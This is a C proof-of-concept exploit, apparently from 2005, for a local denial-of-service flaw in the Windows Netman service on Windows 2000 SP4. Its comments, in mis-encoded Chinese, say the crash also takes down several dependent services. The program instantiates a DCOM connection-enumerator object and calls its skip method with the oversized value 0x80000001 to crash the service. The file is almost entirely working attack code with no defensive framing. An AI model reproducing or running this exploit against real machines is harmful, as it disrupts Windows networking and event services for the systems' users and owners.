/* Windows Netman Service Local DOS Vulnerability.
 *
 * By bkbll bkbll#cnhonker.net 2005-7-14 2:49<CF><C2><CE><E7>
 *
 * TESTED ON win2k sp4
 *
 * <D2><F2><CE><AA>Netman<CA><C7><CD><A8><B9><FD>svchost.exe -k netsvcs<C6><F4><B6><AF>, <B5><B1><B8><C3><B7><FE><CE><F1><CD><A3><D6><B9><B5><F4><BA><F3>,<C8><E7><CF><C2>
<B7><FE><CE><F1><D2><B2><BD><AB><D6><D0><D6><B9>:
 *
 * EventSystem,Irmon,RasMan,NtmsSvc,SENS
 *
 */
#define _WIN32_DCOM

#include <stdio.h>
#include <stdlib.h>
#include <objbase.h>
#include <unknwn.h>
#include <windows.h>

#pragma comment(lib,"ole32")

MIDL_INTERFACE("98133274-4B20-11D1-AB01-00805FC1270E")
VCConnectionManagerEnumConnection //: public IDispatch
{
public:
        virtual HRESULT STDMETHODCALLTYPE QueryInterface(void) = 0;
        virtual ULONG STDMETHODCALLTYPE AddRef( void) = 0;
        virtual ULONG STDMETHODCALLTYPE Release( void) = 0;
        virtual HRESULT STDMETHODCALLTYPE next(void) = 0;
        virtual HRESULT STDMETHODCALLTYPE skip(DWORD) = 0;
        virtual HRESULT STDMETHODCALLTYPE reset(void) = 0;
        virtual HRESULT STDMETHODCALLTYPE clone(void) = 0;
};
CLSID CLSID_ConnectionManagerEnumConnection = {0x0BA126AD2,0x2166,0x11D1,{0xB1,0xD0, 0x0, 0x80, 0x5F, 0x0C1, 0x27, 0x0E}};
IID IID_IEnumNetConnection  = {0xC08956A0,0x1CD3,0x11D1,{0x0B1,0x0C5, 0x0, 0x80, 0x5F, 0x0C1, 0x27, 0x0E}};

//<D6><F7><BA><AF><CA><FD>
main(int argc,char **argv)
{
        VCConnectionManagerEnumConnection *clientcall;
        HRESULT hr;

        printf("Windows Netman Service Local DOS Vulnerability..\n\n");
        //<B3><F5><CA><BC><BB><AF>
        CoInitializeEx(NULL,COINIT_MULTITHREADED);

        printf("DCOM Client Trying started\n");
        hr = CoCreateInstance(CLSID_ConnectionManagerEnumConnection,NULL,CLSCTX_LOCAL_SERVER,IID_IEnumNetConnection,(void**)&clientcall);
        if (hr != S_OK)
        {
                printf("CoCreateInstanceEx failed:%d\n",GetLastError());
                return -1;
        }
        printf("Exploit netman service ....\n");
        hr = clientcall->skip(0x80000001);//(void**)&p);
        if(SUCCEEDED(hr))
        {
                printf("Call client proc Success.\n");
        }
        else
                printf("Call client proc failed:%d\n",GetLastError());
        hr = clientcall->Release();
        CoUninitialize();
        printf("Client exited.\n");
        return 1;
}

